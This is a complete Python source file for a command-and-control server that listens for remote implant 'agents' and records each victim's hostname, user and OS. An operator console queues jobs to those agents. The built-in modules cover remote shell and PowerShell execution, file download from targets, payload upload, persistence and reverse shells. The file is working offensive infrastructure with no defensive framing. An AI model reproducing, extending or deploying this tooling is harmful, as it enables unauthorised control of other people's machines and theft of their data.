#!/usr/bin/env python3
import socket
import threading
import json
import sqlite3
import time
from datetime import datetime
import logging
import os
import readline  # For command history
import glob
import importlib.util

class AdvancedC2Server:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.agents = {}
        self.jobs = {}
        self.running = True
        self.current_agent = None
        self.command_history = []
        self.history_file = "data/command_history.txt"
        self.modules_dir = "modules/"
        
        # Load command history
        self.load_command_history()
        
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger('AdvancedC2Server')
        
        self.init_database()
        self.load_modules()
    
    def load_command_history(self):
        """Load command history from file"""
        try:
            os.makedirs('data', exist_ok=True)
            if os.path.exists(self.history_file):
                with open(self.history_file, 'r') as f:
                    self.command_history = [line.strip() for line in f.readlines() if line.strip()]
                # Set up readline history
                for cmd in self.command_history[-100:]:  # Last 100 commands
                    readline.add_history(cmd)
        except Exception as e:
            self.logger.error(f"Failed to load command history: {e}")
    
    def save_command_to_history(self, command):
        """Save command to history file"""
        if command and command not in ['', 'help', 'clear', 'exit']:
            self.command_history.append(command)
            readline.add_history(command)
            
            # Keep only last 1000 commands in memory
            if len(self.command_history) > 1000:
                self.command_history = self.command_history[-1000:]
            
            # Append to file
            try:
                with open(self.history_file, 'a') as f:
                    f.write(command + '\n')
            except Exception as e:
                self.logger.error(f"Failed to save command history: {e}")
    
    def load_modules(self):
        """Dynamically load modules from modules directory"""
        self.modules = {}
        self.module_categories = {}
        
        if not os.path.exists(self.modules_dir):
            os.makedirs(self.modules_dir)
            self.logger.info(f"Created modules directory: {self.modules_dir}")
            return
        
        # Load built-in modules first
        self.load_builtin_modules()
        
        # Load external modules
        for module_file in glob.glob(os.path.join(self.modules_dir, "*.py")):
            if module_file.endswith("__init__.py"):
                continue
                
            try:
                module_name = os.path.basename(module_file)[:-3]  # Remove .py
                spec = importlib.util.spec_from_file_location(module_name, module_file)
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                
                # Check if module has the required attributes
                if hasattr(module, 'MODULE_INFO'):
                    module_info = module.MODULE_INFO
                    self.modules[module_name] = module_info
                    
                    # Categorize
                    category = module_info.get('category', 'Uncategorized')
                    if category not in self.module_categories:
                        self.module_categories[category] = []
                    self.module_categories[category].append(module_name)
                    
                    self.logger.info(f"Loaded module: {module_name}")
                    
            except Exception as e:
                self.logger.error(f"Failed to load module {module_file}: {e}")
    
    def load_builtin_modules(self):
        """Load built-in modules"""
        builtin_modules = {
            # System Information
            'sysinfo': {
                'name': 'System Information',
                'description': 'Get comprehensive system and network information',
                'category': 'Discovery',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user',
                'builtin': True
            },
            'process_list': {
                'name': 'Process List', 
                'description': 'List running processes with details',
                'category': 'Discovery',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user',
                'builtin': True
            },
            
            # Command Execution
            'shell': {
                'name': 'Shell Command',
                'description': 'Execute system commands',
                'category': 'Execution', 
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user',
                'builtin': True
            },
            'powershell': {
                'name': 'PowerShell',
                'description': 'Execute PowerShell commands (Windows only)',
                'category': 'Execution',
                'platforms': ['windows'],
                'privileges': 'user',
                'builtin': True
            },
            
            # File Operations
            'download': {
                'name': 'Download File',
                'description': 'Download file from target to C2 server',
                'category': 'File Operations',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user',
                'builtin': True
            },
            'upload': {
                'name': 'Upload File', 
                'description': 'Upload file from C2 server to target',
                'category': 'File Operations',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user',
                'builtin': True
            },
            
            # Persistence
            'persistence': {
                'name': 'Persistence',
                'description': 'Establish persistence mechanisms',
                'category': 'Persistence',
                'platforms': ['windows', 'linux'],
                'privileges': 'admin',
                'builtin': True
            },
            
            # Reverse Shell
            'reverse_shell': {
                'name': 'Reverse Shell',
                'description': 'Spawn a reverse shell back to C2 server',
                'category': 'Execution',
                'platforms': ['windows', 'linux', 'macos'],
                'privileges': 'user',
                'builtin': True
            }
        }
        
        for module_name, module_info in builtin_modules.items():
            self.modules[module_name] = module_info
            category = module_info['category']
            if category not in self.module_categories:
                self.module_categories[category] = []
            self.module_categories[category].append(module_name)
    
    def init_database(self):
        self.conn = sqlite3.connect('data/advanced_c2.db', check_same_thread=False)
        self.cursor = self.conn.cursor()
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS agents (
                id TEXT PRIMARY KEY,
                hostname TEXT,
                username TEXT,
                architecture TEXT,
                os_version TEXT,
                internal_ip TEXT,
                first_seen DATETIME,
                last_seen DATETIME,
                status TEXT
            )
        ''')
        self.conn.commit()
    
    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.logger.info(f"🎯 Advanced C2 Server started on {self.host}:{self.port}")
            self.logger.info(f"📦 Loaded {len(self.modules)} modules")
            
            listener_thread = threading.Thread(target=self.accept_connections)
            listener_thread.daemon = True
            listener_thread.start()
            
            self.start_command_interface()
            
        except Exception as e:
            self.logger.error(f"Failed to start server: {e}")
    
    def accept_connections(self):
        while self.running:
            try:
                client_socket, addr = self.server_socket.accept()
                client_socket.settimeout(10.0)
                
                agent_thread = threading.Thread(
                    target=self.handle_agent_connection,
                    args=(client_socket, addr)
                )
                agent_thread.daemon = True
                agent_thread.start()
                
            except Exception as e:
                if self.running:
                    self.logger.error(f"Error accepting connection: {e}")
    
    def handle_agent_connection(self, client_socket, addr):
        agent_id = None
        
        try:
            data = client_socket.recv(4096).decode('utf-8')
            if not data:
                return
                
            message = json.loads(data)
            agent_id = message.get('agent_id')
            
            if not agent_id or message.get('type') != 'checkin':
                return
            
            self.register_agent(agent_id, message.get('system_info', {}), addr, client_socket)
            self.logger.info(f"New agent connected: {agent_id} from {addr[0]}")
            
            while self.running and agent_id in self.agents:
                try:
                    if agent_id in self.jobs and self.jobs[agent_id]:
                        job = self.jobs[agent_id].pop(0)
                        client_socket.send(json.dumps(job).encode('utf-8'))
                        self.logger.info(f"Sent job to {agent_id}: {job['module_name']}")
                    
                    client_socket.settimeout(1.0)
                    try:
                        data = client_socket.recv(4096).decode('utf-8')
                        if data:
                            response = json.loads(data)
                            self.handle_agent_response(agent_id, response)
                    except socket.timeout:
                        continue
                    except json.JSONDecodeError:
                        continue
                        
                except Exception as e:
                    self.logger.error(f"Error communicating with {agent_id}: {e}")
                    break
                    
        except Exception as e:
            self.logger.error(f"Agent connection error: {e}")
        finally:
            if agent_id and agent_id in self.agents:
                del self.agents[agent_id]
                self.logger.info(f"Agent disconnected: {agent_id}")
            try:
                client_socket.close()
            except:
                pass
    
    def register_agent(self, agent_id, system_info, addr, socket):
        self.agents[agent_id] = {
            'socket': socket,
            'system_info': system_info,
            'ip': addr[0],
            'last_seen': datetime.now()
        }
        
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO agents VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                agent_id,
                system_info.get('hostname', 'Unknown'),
                system_info.get('username', 'Unknown'),
                system_info.get('architecture', 'Unknown'),
                system_info.get('os_version', 'Unknown'),
                addr[0],
                datetime.now(),
                datetime.now(),
                'active'
            ))
            self.conn.commit()
        except Exception as e:
            self.logger.error(f"Database error: {e}")
    
    def handle_agent_response(self, agent_id, response):
        if response.get('type') == 'job_result':
            job_id = response.get('job_id')
            output = response.get('output', '')
            
            print(f"\n[📡] INSTANT RESULT from {agent_id}:")
            print(f"    Job: {job_id}")
            print(f"    Output:\n{'-'*40}")
            print(f"{output}")
            print(f"{'-'*40}")
            print(f"C2> ", end='', flush=True)
    
    def send_job(self, agent_id, module_name, arguments=None):
        if agent_id not in self.agents:
            return False
        
        job_id = f"job_{int(time.time())}"
        job = {
            'type': 'job',
            'job_id': job_id,
            'module_name': module_name,
            'arguments': arguments or {}
        }
        
        if agent_id not in self.jobs:
            self.jobs[agent_id] = []
        
        self.jobs[agent_id].append(job)
        self.logger.info(f"Queued job for {agent_id}: {module_name}")
        return True
    
    def start_command_interface(self):
        def command_loop():
            while self.running:
                try:
                    # Enhanced prompt with history indicator
                    if self.current_agent:
                        prompt = f"\nC2[{self.current_agent[:8]}]> "
                    else:
                        prompt = "\nC2> "
                    
                    cmd = input(prompt).strip()
                    self.save_command_to_history(cmd)
                    self.handle_command(cmd)
                    
                except (KeyboardInterrupt, EOFError):
                    print("\n[!] Shutting down...")
                    self.running = False
                    break
                except Exception as e:
                    print(f"[-] Command error: {e}")
        
        thread = threading.Thread(target=command_loop)
        thread.daemon = True
        thread.start()
    
    def handle_command(self, command):
        # Handle history commands
        if command == 'history':
            self.show_command_history()
            return
        elif command.startswith('history '):
            parts = command.split(' ')
            if len(parts) > 1 and parts[1] == 'clear':
                self.clear_command_history()
                return
        
        # Handle module management
        if command == 'reload_modules':
            self.load_modules()
            print(f"[✓] Reloaded {len(self.modules)} modules")
            return
        
        if self.current_agent:
            if command == 'back':
                self.handle_back()
                return
            elif command in ['exit', 'quit']:
                self.running = False
                return
            elif command in ['agents', 'status', 'help', 'clear', 'modules', 'history']:
                pass  # Allow these in interactive mode
            else:
                self.handle_interactive_command(command)
                return
        
        # Main command handling
        if command == 'exit':
            self.running = False
        elif command == 'agents':
            self.list_agents()
        elif command == 'status':
            self.show_status()
        elif command == 'help':
            self.show_help()
        elif command == 'modules':
            self.list_modules()
        elif command == 'history':
            self.show_command_history()
        elif command.startswith('jobs '):
            self.handle_job_command(command)
        elif command.startswith('use '):
            self.handle_use_command(command)
        elif command == 'clear':
            os.system('clear')
        else:
            print("Unknown command. Type 'help'")
    
    def show_command_history(self):
        """Show command history"""
        if not self.command_history:
            print("No command history")
            return
        
        print(f"\nCommand History (Last {len(self.command_history)} commands):")
        print("-" * 50)
        for i, cmd in enumerate(self.command_history[-20:], 1):  # Show last 20
            print(f"{i:3d}. {cmd}")
    
    def clear_command_history(self):
        """Clear command history"""
        self.command_history = []
        readline.clear_history()
        try:
            if os.path.exists(self.history_file):
                os.remove(self.history_file)
            print("[✓] Command history cleared")
        except Exception as e:
            print(f"[-] Failed to clear history: {e}")
    
    def handle_use_command(self, command):
        parts = command.split(' ')
        if len(parts) < 2:
            print("Usage: use <agent_id>")
            return
        
        agent_id = parts[1]
        if agent_id not in self.agents:
            print(f"[-] Agent {agent_id} not connected")
            return
        
        self.current_agent = agent_id
        agent_info = self.agents[agent_id]
        sysinfo = agent_info.get('system_info', {})
        
        print(f"[+] Interactive mode with {agent_id}")
        print(f"    Hostname: {sysinfo.get('hostname', 'Unknown')}")
        print(f"    User: {sysinfo.get('username', 'Unknown')}")
        print(f"    OS: {sysinfo.get('os_version', 'Unknown')}")
        print("    Type commands directly or 'back' to exit")
        print("    Type 'help' for available commands")
        print("    Use ↑/↓ arrows for command history")
    
    def handle_back(self):
        if self.current_agent:
            print(f"[+] Exiting interactive mode with {self.current_agent[:8]}...")
            self.current_agent = None
        else:
            print("[-] Not in interactive mode")
    
    def handle_interactive_command(self, command):
        parts = command.split(' ', 1)
        module_name = parts[0]
        arguments = parts[1] if len(parts) > 1 else ""
        
        # Enhanced command mapping
        command_map = {
            'ls': 'file_browser', 'dir': 'file_browser',
            'ps': 'process_list', 'pwd': 'shell',
            'whoami': 'shell', 'ipconfig': 'shell',
            'ifconfig': 'shell', 'netstat': 'shell'
        }
        
        actual_module = command_map.get(module_name, module_name)
        
        # Handle special commands
        args_dict = {}
        if actual_module == 'shell':
            if module_name in ['whoami', 'pwd']:
                args_dict = {'command': module_name}
            elif module_name in ['ipconfig', 'ifconfig', 'netstat']:
                args_dict = {'command': module_name}
            else:
                args_dict = {'command': arguments or module_name}
        elif actual_module == 'reverse_shell':
            # Generate reverse shell command
            reverse_port = 4445  # Different port for reverse shells
            args_dict = {'lhost': self.host, 'lport': reverse_port}
        else:
            if arguments:
                try:
                    args_dict = json.loads(arguments)
                except:
                    args_dict = {'args': arguments}
        
        if actual_module not in self.modules:
            print(f"[-] Unknown command: {module_name}")
            print(f"[*] Type 'help' for available commands")
            return
        
        if self.send_job(self.current_agent, actual_module, args_dict):
            module_info = self.modules[actual_module]
            print(f"[→] {module_info['name']} sent to agent...")
        else:
            print(f"[-] Failed to send command")
    
    def list_agents(self):
        if not self.agents:
            print("No active agents")
            return
        
        print(f"\nActive Agents ({len(self.agents)}):")
        print("-" * 60)
        for agent_id, info in self.agents.items():
            sysinfo = info.get('system_info', {})
            print(f"ID: {agent_id}")
            print(f"  IP: {info.get('ip', 'Unknown')}")
            print(f"  Hostname: {sysinfo.get('hostname', 'Unknown')}")
            print(f"  User: {sysinfo.get('username', 'Unknown')}")
            print(f"  OS: {sysinfo.get('os_version', 'Unknown')}")
            print("-" * 60)
    
    def list_modules(self):
        if not self.module_categories:
            print("No modules loaded")
            return
        
        print(f"\n🛠️  Available Modules ({len(self.modules)} total):")
        print("=" * 80)
        
        for category, modules in self.module_categories.items():
            print(f"\n📂 {category}:")
            print("-" * 40)
            for module_id in modules:
                module_info = self.modules[module_id]
                platforms = ", ".join(module_info['platforms'])
                privs = module_info['privileges']
                builtin = " (built-in)" if module_info.get('builtin') else ""
                print(f"  {module_id:<15} - {module_info['name']}{builtin}")
                print(f"      {module_info['description']}")
                print(f"      Platforms: {platforms} | Privileges: {privs}")
    
    def show_status(self):
        print(f"\n🎯 Advanced C2 Server Status:")
        print(f"  Active agents: {len(self.agents)}")
        print(f"  Available modules: {len(self.modules)}")
        print(f"  Command history: {len(self.command_history)} commands")
        print(f"  Listening: {self.host}:{self.port}")
        if self.current_agent:
            print(f"  Interactive mode: ACTIVE (agent: {self.current_agent[:8]}...)")
    
    def show_help(self):
        print("\n🎯 Advanced C2 Commands:")
        print("  agents                    - List active agents")
        print("  status                    - Show server status")
        print("  modules                   - Show all available modules")
        print("  use <agent_id>            - Enter interactive mode")
        print("  jobs <agent_id> <module> [args] - Send job")
        print("  history                   - Show command history")
        print("  history clear             - Clear command history")
        print("  reload_modules            - Reload modules from disk")
        print("  clear                     - Clear screen")
        print("  exit                      - Shutdown server")
        print("  help                      - Show this help")
        
        if self.current_agent:
            print(f"\n💡 Interactive Mode (Agent: {self.current_agent[:8]}...):")
            print("  Type commands directly (supports command history with ↑/↓)")
            print("  ls, dir, ps, whoami, pwd, ipconfig, etc. - Shortcut commands")
            print("  reverse_shell           - Spawn reverse shell back to C2")
            print("  back                    - Exit interactive mode")

if __name__ == "__main__":
    server = AdvancedC2Server('0.0.0.0', 4444)
    server.start()
    
    try:
        while server.running:
            time.sleep(1)
    except KeyboardInterrupt:
        server.running = False